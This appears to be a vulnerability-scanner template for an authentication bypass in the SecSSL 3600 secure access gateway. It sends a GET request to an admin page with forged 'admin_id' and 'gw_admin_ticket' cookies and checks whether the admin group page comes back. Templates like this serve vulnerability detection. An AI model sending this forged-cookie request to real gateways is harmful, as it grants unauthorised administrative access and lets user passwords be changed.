id: secsslvpn-auth-bypass
brief:
    title: Secure Access Gateway SecSSLVPN - Authentication Bypass
    by: SleepingBag945
    level: high
    about: The Secure Access Gateway SecSSL 3600 secure access gateway system has an unauthorized access vulnerability. An attacker can obtain the user list and modify the user account password through the vu...
    label:
        - secsslvpn
        - auth-bypass
        - vuln
moves:
    - verb: GET
      to:
        - '{{BaseURL}}/admin/group/x_group.php?id=1'
      head:
        Cookie: admin_id=1; gw_admin_ticket=1;
      signs:
        - "on": word
          has:
            - group_action.php
            - anonymous
          in: body
          need: all
        - "on": word
          has:
            - text/html
          in: header
          need: all
        - "on": status
          status:
            - 200
